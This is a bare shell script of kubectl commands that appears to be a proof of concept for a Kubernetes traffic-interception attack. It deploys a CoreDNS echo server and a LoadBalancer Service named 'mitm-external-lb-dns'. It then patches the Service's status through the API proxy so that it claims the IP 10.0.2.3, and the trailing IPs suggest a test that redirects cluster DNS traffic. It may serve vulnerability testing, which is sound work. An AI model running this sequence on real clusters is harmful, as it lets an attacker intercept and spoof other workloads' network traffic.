kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: dig-pod
spec:
  containers:
    - name: dig
      image: sequenceiq/alpine-dig:latest
      command: [ "/bin/sleep", "3600" ]
---
apiVersion: v1
kind: Pod
metadata:
  name: dig-node
spec:
  hostNetwork: true
  containers:
    - name: dig
      image: sequenceiq/alpine-dig:latest
      command: [ "/bin/sleep", "3600" ]
EOF

##
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: tcc
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: echoserver-dns
  namespace: tcc
data:
  Corefile: |
    kubernetes.io:53 {
        errors
        log
        health
        ready
        whoami
    }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: echoserver-dns
  namespace: tcc
spec:
  replicas: 1
  selector:
    matchLabels:
      app: echoserver-dns
  template:
    metadata:
      labels:
        app: echoserver-dns
    spec:
      containers:
      - args:
        - -conf
        - /etc/coredns/Corefile
        image: docker.io/coredns/coredns:1.6.0
        livenessProbe:
          failureThreshold: 10
          httpGet:
            path: /health
            port: 8080
            scheme: HTTP
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 5
        name: coredns
        ports:
        - containerPort: 53
          name: dns
          protocol: UDP
        - containerPort: 53
          name: dns-tcp
          protocol: TCP
        readinessProbe:
          failureThreshold: 10
          httpGet:
            path: /ready
            port: 8181
            scheme: HTTP
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 5
        securityContext:
          allowPrivilegeEscalation: false
          capabilities:
            add:
            - NET_BIND_SERVICE
            drop:
            - all
          readOnlyRootFilesystem: true
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /etc/coredns
          name: config-volume
      volumes:
      - configMap:
          defaultMode: 420
          items:
          - key: Corefile
            path: Corefile
          name: echoserver-dns
        name: config-volume
EOF

##

kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-external-lb-dns
  namespace: tcc
spec:
  ports:
  - name: dnsu
    port: 53
    targetPort: 53
    protocol: UDP
  selector:
    app: echoserver-dns
  type: LoadBalancer
  loadBalancerIP: 10.0.2.3
EOF
kubectl proxy --port=8080 &
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/tcc/services/mitm-external-lb-dns/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"10.0.2.3"}]}}}'
pkill kubectl


10.96.0.10



10.0.2.3